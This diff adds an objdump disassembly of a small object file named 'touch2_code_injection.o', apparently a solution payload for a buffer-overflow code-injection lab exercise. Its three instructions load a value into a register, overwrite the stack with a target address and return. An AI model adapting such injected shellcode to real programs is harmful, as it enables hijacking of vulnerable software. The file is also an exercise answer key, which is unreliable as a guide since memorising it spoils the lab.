@@ -1,0 +1,10 @@
+
+touch2_code_injection.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:	bf e7 e9 88 57       	mov    $0x5788e9e7,%edi
+   5:	c7 04 24 87 19 40 00 	movl   $0x401987,(%rsp)
+   c:	c3                   	retq   
